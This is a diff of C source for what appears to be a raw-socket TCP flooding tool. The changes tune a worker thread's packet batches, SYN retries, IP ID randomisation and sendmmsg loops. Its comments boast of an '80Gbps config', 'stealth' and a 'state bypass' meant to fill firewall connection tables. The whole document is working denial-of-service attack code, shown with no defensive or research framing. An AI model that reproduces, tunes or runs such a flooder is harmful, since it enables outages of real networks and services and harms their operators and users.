@@ -1776,7 +1776,7 @@ void *worker_thread(void *arg) {
         #define V17PL   1440
         #define V17FLEN (V17ETH+V17IP+V17TCP+V17PL)
         #define HUGE_PL_SIZE (1024 * 1024)
-        int V17B = stealth ? 4096 : 4096;
+        int V17B = 256; // Proven 80Gbps config
 
         // Slot state
         #define ST_SYN_SENT    0
@@ -1784,7 +1784,7 @@ void *worker_thread(void *arg) {
         #define ST_FORCE_EST   2
 
         // Force real 3WHS: FW MUST create state entry for each connection
-        int SYN_MAX_RETRY = 3;
+        int SYN_MAX_RETRY = 10; // After this many SYN without SYN-ACK, force stateless
 
         // No ramp — full power from round 1
         #define SOFT_START_ROUNDS 1
@@ -2202,7 +2202,7 @@ void *worker_thread(void *arg) {
                     
                     // State bypass: Rapid IP ID and fragment variation on teardown
                     ih->id=htons(fast_rand()&0xFFFF);
-                    ih->frag_off = (fast_rand() % 4 == 0) ? htons(0x4000) : 0; // 25% DF bit set
+                    ih->frag_off=htons(0x4000);
                     ih->check=0;
                     unsigned short *iw2=(unsigned short*)ih;
                     unsigned int ic=iw2[0]+iw2[3]+htons((unsigned int)(ih->ttl<<8|IPPROTO_TCP))+iw2[6]+iw2[7]+iw2[8]+iw2[9];
@@ -2309,7 +2309,8 @@ void *worker_thread(void *arg) {
             }
             
             if(valid_pkts == 0){
-                continue; // No sleep — spin fast to catch SYN-ACKs for instant shock
+                usleep(50); // Short sleep — keep SYN pressure high for fast 3WHS
+                continue; // Skip sendmmsg, loop back to SYN/recv quickly
             }
             
             // REMOVED: usleep(250) was artificially limiting PPS to ~1M/thread
@@ -2319,67 +2320,26 @@ void *worker_thread(void *arg) {
                 LOG_INFO("T%d: hot loop done, calling sendmmsg valid_pkts=%d",tid,valid_pkts);
                 fflush(stdout);
             }
-            // 128x burst, dual socket, skip checksum between bursts
-            int cur_fd = fd_send;
-            unsigned long long total_sent = 0, total_bytes = 0;
-            int burst_count = 256;
-            for(int burst = 0; burst < burst_count; burst++) {
-                int sent=sendmmsg(cur_fd,vmsg_active,valid_pkts,0);
-                if(sent>0){
-                    total_sent += sent;
-                    for(int i=0; i<sent; i++) total_bytes += vmsg_active[i].msg_hdr.msg_iov->iov_len;
-                } else {
-                    if(errno==ENOBUFS||errno==EAGAIN){
-                        cur_fd = (cur_fd == fd_send) ? fd_send2 : fd_send;
-                        usleep(1);
-                        continue;
-                    }
-                    else break;
+            int sent=sendmmsg(fd_send,vmsg_active,valid_pkts,0);
+            if(sent>0){
+                unsigned long long tb2=0;
+                for(int i=0; i<sent; i++){
+                    tb2 += vmsg_active[i].msg_hdr.msg_iov->iov_len;
                 }
-                
-                // Update seq/checksum for NEXT burst (all modes)
-                for(int i = 0; i < valid_pkts; i++) {
-                    struct iphdr *bih;
-                    struct tcphdr *bth;
-                    unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
-                    unsigned short old_seq_hi, old_seq_lo, old_ipid, old_ip_check, old_tcp_check;
-                    unsigned int new_seq;
-                    unsigned short new_seq_hi, new_seq_lo;
-                    unsigned int ip_diff, ip_ck, tcp_diff, tcp_ck;
-
-                    if(use_afp) { bih=(struct iphdr*)(bfr+V17ETH); bth=(struct tcphdr*)(bfr+V17ETH+V17IP); }
-                    else { bih=(struct iphdr*)bfr; bth=(struct tcphdr*)(bfr+V17IP); }
-                    
-                    old_seq_hi = ((unsigned short*)&bth->seq)[0];
-                    old_seq_lo = ((unsigned short*)&bth->seq)[1];
-                    old_ipid = bih->id;
-                    old_ip_check = bih->check;
-                    old_tcp_check = bth->check;
-                    
-                    unsigned int p_len = ntohs(bih->tot_len) - V17IP - (bth->doff * 4);
-                    new_seq = ntohl(bth->seq) + p_len;
-                    bth->seq = htonl(new_seq);
-                    bih->id = htons(ntohs(bih->id) + 1);
-                    
-                    new_seq_hi = ((unsigned short*)&bth->seq)[0];
-                    new_seq_lo = ((unsigned short*)&bth->seq)[1];
-                    
-                    ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
-                    ip_ck = (~old_ip_check & 0xFFFF) + ip_diff;
-                    ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
-                    bih->check = (unsigned short)~ip_ck;
-                    
-                    tcp_diff = (~old_seq_hi & 0xFFFF) + (new_seq_hi & 0xFFFF)
-                                          + (~old_seq_lo & 0xFFFF) + (new_seq_lo & 0xFFFF);
-                    tcp_ck = (~old_tcp_check & 0xFFFF) + tcp_diff;
-                    tcp_ck = (tcp_ck >> 16) + (tcp_ck & 0xFFFF); tcp_ck += (tcp_ck >> 16);
-                    bth->check = (unsigned short)~tcp_ck;
+                thread_stats[tid].packets     +=sent;
+                thread_stats[tid].tcp_packets +=sent;
+                thread_stats[tid].raw_sent    +=sent;
+                thread_stats[tid].bytes       +=tb2;
+            } else {
+                thread_stats[tid].send_errors++;
+                if(thread_stats[tid].send_errors==1){
+                    LOG_INFO("T%d: sendmmsg FAIL fd=%d use_afp=%d valid_pkts=%d errno=%d (%s)",
+                             tid,fd_send,use_afp,valid_pkts,errno,strerror(errno));
+                    fflush(stdout);
                 }
+                if(errno==ENOBUFS||errno==EAGAIN){ usleep(50); continue; }
+                else continue;
             }
-            thread_stats[tid].packets     += total_sent;
-            thread_stats[tid].tcp_packets += total_sent;
-            thread_stats[tid].raw_sent    += total_sent;
-            thread_stats[tid].bytes       += total_bytes;
             // Stealth: no extra jitter needed, pulse timing handles it
         }
 
